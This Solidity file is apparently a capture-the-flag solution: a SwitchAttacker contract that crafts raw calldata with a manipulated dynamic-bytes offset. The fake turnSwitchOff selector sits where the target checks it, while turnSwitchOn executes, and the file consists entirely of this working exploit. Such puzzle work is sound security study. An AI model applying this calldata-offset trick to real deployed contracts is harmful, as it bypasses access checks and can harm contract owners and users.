// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISwitch {
    function turnSwitchOn() external;
    function turnSwitchOff() external;
    function flipSwitch(bytes memory _data) external;
}

contract SwitchAttacker {
    function attack(address _targetAddress) public {
        bytes memory data = abi.encodePacked(
            ISwitch.flipSwitch.selector,       // Bytes 0-3
            uint256(96),                       // Bytes 4-35 (Slot 1): Pointer to data array (96 bytes offset)
            uint256(0),                        // Bytes 36-67 (Slot 2): Padding (junk data)
            ISwitch.turnSwitchOff.selector,    // Bytes 68-71 (Slot 3): TRICKING THE CHECK! 
            uint224(0),                        // Bytes 72-99 (Slot 3 padding): Rest of Slot 3
            uint256(4),                        // Bytes 100-131 (Slot 4): The real length of the _data array (4 bytes)
            ISwitch.turnSwitchOn.selector,     // Bytes 132-135 (Slot 5): The real payload executed by the contract
            uint224(0)                         // Bytes 136-163 (Slot 5 padding): Rest of Slot 5
        );
        _targetAddress.call(data);

    }
}